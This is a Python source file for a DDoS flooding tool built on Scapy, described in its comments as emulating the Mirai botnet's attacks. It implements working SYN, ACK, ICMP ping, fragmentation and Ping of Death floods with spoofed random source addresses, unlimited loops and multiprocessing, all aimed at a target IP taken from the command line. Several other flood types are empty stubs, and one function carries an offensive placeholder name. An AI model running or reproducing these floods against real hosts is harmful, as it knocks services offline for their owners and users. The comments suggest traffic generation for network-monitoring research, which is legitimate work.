#!/usr/bin/env python3
import sys, time, random, os, socket, argparse, ipaddress, threading, multiprocessing, string
from scapy.all import *
from multiprocessing import Process
import dns.resolver

# This was developed with the purpose of emulating the attacks performed by the MIRAI worm:
#https://github.com/jgamblin/Mirai-Source-Code/blob/master/mirai/bot/attack_tcp.c
# This should include those found on Mirai and other attacks that may be possible to observe being executed by other botnets

# Arguments specification
parser = argparse.ArgumentParser()
#parser.add_argument("-d", "--dst_ip", help="Specify a target destination IP address")
parser.add_argument("dst_ip", help="Specify a target destination IP address")
parser.add_argument("-s", "--src_ip", help="Specify a source IP address. Default is random.")
parser.add_argument("--multithread", help="Uses multithreading for concurrent floods.", action="store_true")
parser.add_argument("-f", "--fragmentation", help="Uses fragmentation for 'TEARING' type floods OR meeting MTU.", action="store_true")
parser.add_argument("-t", "--interval", type=float, help="Specify a time interval between packets (in seconds). Default is 0.")
parser.add_argument("-dp", "--dport", help="Specify a destination Port. Default is random.")
parser.add_argument("-sp", "--sport", help="Specify a source Port. Default is random.")
parser.add_argument("-r", "--repeat", type=int, help="Specify a number of packets to send. Default is 0. Set 0 to unlimited.")
args = parser.parse_args()


#src_ip = ".".join(map(str, (random.randint(0,254)for i in range(4)))) if args.src_ip is None else args.src_ip # This generator includes any reserved address spaces. As of now, Scapy's built-in generator is being used, although it may be slower or power-consuming than manual generation.
src_ip = RandIP() if args.src_ip is None else args.src_ip
dst_ip = args.dst_ip # Implement address verification

dport = 0 if args.dport is None else int(args.dport)
sport = 0 if args.sport is None else int(args.sport)

power = args.multithread

frag = args.fragmentation

src_desc = "[random]" if args.src_ip is None else str(args.src_ip)
target_desc = str(dst_ip)

repeat = 0 if args.repeat is None else int(args.repeat)
if repeat < 0: repeat = -repeat

interval = 0 if args.interval is None else args.interval

ua_list = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
    'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36',
    'Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)',
    'Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 6.2; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)',
    'Mozilla/5.0 (Windows NT 6.1; Win64; x64; Trident/7.0; rv:11.0) like Gecko',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
    'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)',
    'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729)'
]


def main():
	if not checkSu():
		sys.exit("Requires super user, exiting..")
	print("\nSource: %s\nTarget: %s" %(src_desc, dst_ip))
	print(r'''                                                            
		      ██████  ██░ ██  ██▀███  ▓█████  ██ ▄█▀
		    ▒██    ▒ ▓██░ ██▒▓██ ▒ ██▒▓█   ▀  ██▄█▒ 
		    ░ ▓██▄   ▒██▀▀██░▓██ ░▄█ ▒▒███   ▓███▄░ 
		      ▒   ██▒░▓█ ░██ ▒██▀▀█▄  ▒▓█  ▄ ▓██ █▄ 
		    ▒██████▒▒░▓█▒░██▓░██▓ ▒██▒░▒████▒▒██▒ █▄
		    ▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▒ ▓▒
		    ░ ░▒  ░ ░ ▒ ░▒░ ░  ░▒ ░ ▒░ ░ ░  ░░ ░▒ ▒░
		    ░  ░  ░   ░  ░░ ░  ░░   ░    ░   ░ ░░ ░ 
		        ░   ░  ░  ░   ░        ░  ░░  ░   
		                                        
                           ▄████████  ▄█   ▄██████▄                              
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                           ███    ███ ███▌ ███    ███                             
                         ▀███████████ ███▌ ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    ███ ███  ███    ███                             
                           ███    █▀  █▀    ▀██████▀                              
   ▄████████  ▄█        ▄██████▄   ▄██████▄  ████████▄     ▄████████    ▄████████ 
  ███    ███ ███       ███    ███ ███    ███ ███   ▀███   ███    ███   ███    ███ 
  ███    █▀  ███       ███    ███ ███    ███ ███    ███   ███    █▀    ███    ███ 
 ▄███▄▄▄     ███       ███    ███ ███    ███ ███    ███  ▄███▄▄▄      ▄███▄▄▄▄██▀ 
▀▀███▀▀▀     ███       ███    ███ ███    ███ ███    ███ ▀▀███▀▀▀     ▀▀███▀▀▀▀▀   
  ███        ███       ███    ███ ███    ███ ███    ███   ███    █▄  ▀███████████ 
  ███        ███▌    ▄ ███    ███ ███    ███ ███   ▄███   ███    ███   ███    ███ 
  ███        █████▄▄██  ▀██████▀   ▀██████▀  ████████▀    ██████████   ███    ███ 
             ▀                                                         ███    ███ 


			  ##############################
			  #       OPTIONS MENU:        #
			  ##############################
			  # 1)  SYN   Flood            #
			  # 2)  UDP   Flood            #
			  # 3)  UDP*  Flood (Plain)    #
			  # 4)  ACK   Flood            #
			  # 5)  ACK*  Flood (3-Way TCP)#
			  # 6)  GET   Flood (HTTP)     #
			  # 7)  POST  Flood (HTTP)     #
			  # 8)  ICMP  Flood (echo-req) #
			  # 9)  ICMP  PoD   (Max. IPv4)#
			  # 10) IKE   Flood (ISAKMP)   #
			  # 11) 6LoWPAN     (Layer 7)  #
			  # 12) DNS   Flood (nxdomain) #
			  # 13) SlowLoris   (HTTP)     #
			  #                            #
			  # 0) Exit                    #
			  ############################## 
	  ''')

	choice = input("Select Flood type:\n>>")

	if choice == '1': # beta
		synFlood(src_ip,dst_ip,repeat,sport,dport,interval,power) 
	elif choice == '2':
		udpFlood()
	elif choice == '3':
		udpPlainFlood()
	elif choice == '4': # beta
		ackFlood(src_ip,dst_ip,repeat,sport,dport,interval,power)
	elif choice == '5': # beta
		postAckFlood(dst_ip,repeat,dport)
	elif choice == '6':
		httpGetFlood()
	elif choice == '7':
		httpPostFlood()
	elif choice == '8': # beta
		pingFlood(src_ip,dst_ip,repeat,interval,power)
	elif choice == '9': # beta
		podFlood(src_ip,dst_ip,repeat,interval,power)
	elif choice == '13':
		slowLoris()
	elif choice == '10':
		udpPlainFlood()
	elif choice == '11':
		sixLowLifeDisabledMidgetPorn()
	elif choice == '12':
		dnsFlood()
	elif choice == '0':
		exit()
	else:
		print("Oopsies, try again..")
		main()
	return 0

#https://scapy.readthedocs.io/en/latest/usage.html
#https://0xbharath.github.io/art-of-packet-crafting-with-scapy/scapy/sending_recieving/index.html

def checkSu(): return os.getuid() == 0

#################
#   SYN FLOOD   #
#################

def synFlood(src,dst,times,sport,dport,inter,power):
	def subSynFlood(src,dst,times,sport,dport,inter):
		loopit = 0 if times is not 0 else 1
		srcip = RandIP() if src is 0 else src
		print("Flooding %s:%d, %d times.." % (dst,dport,times))
		if loopit:
			tic = time.clock()
			if sport == 0 & dport != 0:
				packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=int(dport))
				send(packet, verbose=0, loop=loopit, inter=inter)
			elif dport == 0 & sport != 0:
				packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=int(sport),  dport=RandShort())
				send(packet, verbose=0, loop=loopit, inter=inter)
			elif  sport == 0 & dport == 0:
				packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort())
				send(packet, verbose=0, loop=loopit, inter=inter)
			else:
				packet = IP(src=src, dst=dst)/TCP(flags="S",  sport=int(sport),  dport=int(dport))
				send(packet, verbose=0, loop=loopit, inter=inter)
			toc = time.clock() - tic
			print("Flood ended (dur: %f)" % toc)
		else:
			#while 1: #send(packet, loop=1) OR while 1: send(packet)?
			#	packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort(), seq=random.randint(1,9999), window=random.randint(1,9999))
			#	send(packet, verbose=0)
			tic = time.clock()
			if sport == 0 & dport != 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=int(dport))
				send(packet, verbose=0, loop=loopit, count=times, inter=inter)
			elif dport == 0 & sport != 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=int(sport),  dport=RandShort())
				send(packet, verbose=0, loop=loopit, count=times, inter=inter)
			elif  sport == 0 & dport == 0:
				packet = IP(dst=dst)/TCP(flags="S",  sport=RandShort(),  dport=RandShort())
				send(packet, verbose=0, loop=loopit, count=times, inter=inter)
			else:
				packet = IP(dst=dst)/TCP(flags="S",  sport=int(sport),  dport=int(dport))
				send(packet, verbose=0, loop=loopit, count=times, inter=inter)
			toc = time.clock() - tic
			print("Flood ended (dur: %f)" % toc)
			
	if power:# Remove multi thread?
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded SYN Flood. Using %s threads" % cpu_count)
			for i in range(0,cpu_count+1):
				#thread = threading.Thread(target=subSynFlood,args=(src,dst,times,sport,dport,inter))
				proc = Process(target=subSynFlood,args=(src,dst,times,sport,dport,inter))
				proc.start()
				proc.join()
				#thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(cpu_count):
				#thread = threading.Thread(target=subSynFlood,args=(src,dst,times,sport,dport,inter))
				#thread.stop()
				#thread.kill()
				proc.terminate()
				proc.stop()
				proc.kill()
	else:
		print("SYN Flood started!")
		subSynFlood(src,dst,times,sport,dport,inter)
		
	return 0

#################
#   POD FLOOD   #
#################

# Ping of Death (max size of packet, icmp)
def podFlood(src,dst,times,inter,power):# Exceeds MTU, 65000B+ icmp
	def subPod(src,dst,times,inter):
			packet = IP(dst=dst, flags=2)/ICMP(type=8)/("shrek"*13000)
			send(packet, verbose=0, loop=1, inter=inter)

	if power:
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded Ping of Death. Using %s threads" % cpu_count)
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPod,args=(src,dst,times,inter))
				thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(cpu_count):
				thread = threading.Thread(target=subPod,args=(src,dst,times,inter))
				thread.stop()
				thread.kill()
	else:
		print("Starting Ping of Death..")
		subPod(src,dst,times,inter)
	
	return 0 



#################
#   PING FLOOD  #
#################

# The MTU should be considered; 1500B is maximum for general purpose networks (https://pt.wikipedia.org/wiki/MTU)
def pingFlood(src,dst,times,inter,power):#ICMP echo request Flood (aka Ping of Death)
	global frag
	#https://www.ietf.org/rfc/rfc0792.txt
	#https://scapy.readthedocs.io/en/latest/api/scapy.layers.inet.html
	def subPingFlood(src,dst,times,inter):
		# 'FRAG' flag sets
		if frag:
			# Fragmentation / TEAR attack (ICMP & UDP) -> Scapy flag 1 is actually MF and flag 2 is DF!!!
			print("Using fragmentation ICMP Flood..")
			if times != 0:
				for i in range (0,times):
					packet=IP(dst=dst, flags=1, id=RandShort(), frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
					send(packet, verbose=0, inter=inter) 
			while 1:
				packet=IP(dst=dst, flags=1, id=RandShort(), frag=random.randint(1,1024))/ICMP(type=8)/("shrek"*42)
				send(packet, verbose=0, inter=inter)
		# Regular, no flags set
		else:
			print("Shreking..")
			if times != 0:
				packet=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
				send(packet, verbose=1, count=times, inter=inter) # count=times OR for i in [0,times]?
			else:
				#packet=IP(dst=dst)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
				packet=IP(dst=dst, flags=2, frag=0)/ICMP(type=8)/("shrek"*42) # payload is not randomized for increased pps; might be a future implementation (feature/option)
				send(packet, verbose=0, loop=1, inter=inter)
	
	# 'POWER' flag set
	if power:
		# Flag bit -> 1 = Dont Fragment; 2 = More Fragments (https://en.wikipedia.org/wiki/IPv4#Flags) HOWEVER! -> Scapy flag 1 is actually MF and flag 2 is DF!!!
		cpu_count = multiprocessing.cpu_count()
		try:		
			print("Starting multithreaded ICMP (echo-reply) Flood. Using %s threads" % cpu_count)
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPingFlood,args=(src,dst,times,inter))
				thread.start()
		except (KeyboardInterrupt,SystemExit):
			for i in range(0,cpu_count):
				thread = threading.Thread(target=subPingFlood,args=(src,dst,times,inter))
				thread.stop()
				thread.kill()
	else:
		subPingFlood(src,dst,times,inter)

	return 0

#################
#   ACK FLOOD   #
#################

def ackFlood(src,dst,times,sport,dport,inter,power):
	loopit = 0 if times is not 0 else 1
	srcip = RandIP() if src is 0 else src
	print("ACK flooding %s:%d, %d times.." % (dst,dport,times))
	if loopit:
		tic = time.clock()
		if sport == 0 & dport != 0:
			packet = IP(src=src, dst=dst)/TCP(flags="A",  sport=RandShort(),  dport=int(dport))/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, inter=inter)
		elif dport == 0 & sport != 0:
			packet = IP(src=src, dst=dst)/TCP(flags="A",  sport=int(sport),  dport=RandShort())/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, inter=inter)
		elif  sport == 0 & dport == 0:
			packet = IP(src=src, dst=dst)/TCP(flags="A",  sport=RandShort(),  dport=RandShort())/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, inter=inter)
		else:
			packet = IP(src=src, dst=dst)/TCP(flags="A",  sport=int(sport),  dport=int(dport))/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, inter=inter)
		toc = time.clock() - tic
		print("ACK flood ended (dur: %f)" % toc)
	else:
		#while 1: #send(packet, loop=1) OR while 1: send(packet)?
		tic = time.clock()
		if sport == 0 & dport != 0:
			packet = IP(dst=dst)/TCP(flags="A",  sport=RandShort(),  dport=int(dport))/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, count=times, inter=inter)
		elif dport == 0 & sport != 0:
			packet = IP(dst=dst)/TCP(flags="A",  sport=int(sport),  dport=RandShort())/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, count=times, inter=inter)
		elif  sport == 0 & dport == 0:
			packet = IP(dst=dst)/TCP(flags="A",  sport=RandShort(),  dport=RandShort())/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, count=times, inter=inter)
		else:
			packet = IP(dst=dst)/TCP(flags="A",  sport=int(sport),  dport=int(dport))/fuzz(Raw())	
			send(packet, verbose=0, loop=loopit, count=times, inter=inter)
		toc = time.clock() - tic
		print("ACK flood ended (dur: %f)" % toc)
	return 0


#################
#   POST-SHAKE  #
#################

def postAckFlood(dst,times,dport):
	# Alternative ACK Flood that establishes TCP 3-way Handshake first
	#if dport == 0: dport = RandShort() # dport cannot be random as it requires 3 way handshake completion
	packet = IP(dst=dst)/TCP(flags="A",dport=dport)/fuzz(Raw())		
	try:
		socket_=socket.socket()
		socket_.connect((dst,dport))
		stream=StreamSocket(socket_)
	except ConnectionRefusedError:
		print("Couldn't complete the 3-way handshake..")
		pass
		print("Stompin'n'Shrekin!")
	if times is 0:
		send(packet, verbose=0,loop=1)
	elif times is not 0:
		#for i in range(0,times):
		send(packet, verbose=0,count=times)

	return 0

def udpFlood():

	return 0

def udpPlainFlood():

	return 0

def dnsFlood():
	dns.resolver.default_resolver = dns.resolver.Resolver(configure=False)
	dns.resolver.default_resolver.nameservers = ['8.8.8.8', '2001:4860:4860::8888'] # Make it receive a specific IP for the authoritative DNS server! (this is google's)
	#while 1:
	s = randomStr()
	sr1(IP(dst="8.8.8.8")/UDP()/DNS(rd=2,qd=DNSQR(qname=s + ".google.com")), timeout=1)
	reqs = dns.resolver.query(s+'.google.com','aaaa')
	for res in reqs:
		print(res)
#
	return 0

def httpGetFlood():

	return 0

def httpPostFlood():

	return 0

def slowLoris():
	global ua_list
	randomUser = random.choice(ua_list)
	print("Cosen UA:\n",randomUser)

	return 0

#https://scapy.readthedocs.io/en/latest/api/scapy.layers.sixlowpan.html
# Nota: isto é util para no futuro testar o Netflow com Softflowd a capturar/recolher IPv6, por exemplo
def sixLowLifeDisabledMidgetPorn():# Ignore placeholder names

	return 0

# Utility for dns subdomain requests
def randomStr(size=8):
	letters = string.ascii_lowercase
	return ''.join(random.choice(letters) for i in range(size))

if __name__ == "__main__":
	try:
		main()
	except (KeyboardInterrupt):
		sys.exit("\nGET SHREKT")



#https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/
#https://github.com/ep4sh/pyddos/blob/master/Slowloris.py
#https://github.com/adrianchifor/pyslowloris/blob/master/slowloris.py
#https://github.com/gkbrk/slowloris/blob/master/slowloris.py
#https://github.com/ep4sh/pyddos
#https://github.com/EmreOvunc/Python-SYN-Flood-Attack-Tool/blob/master/SYN-Flood.py
#https://github.com/vodkabears/synflood/blob/master/synflood.py
#https://security.radware.com/ddos-knowledge-center/ddospedia/

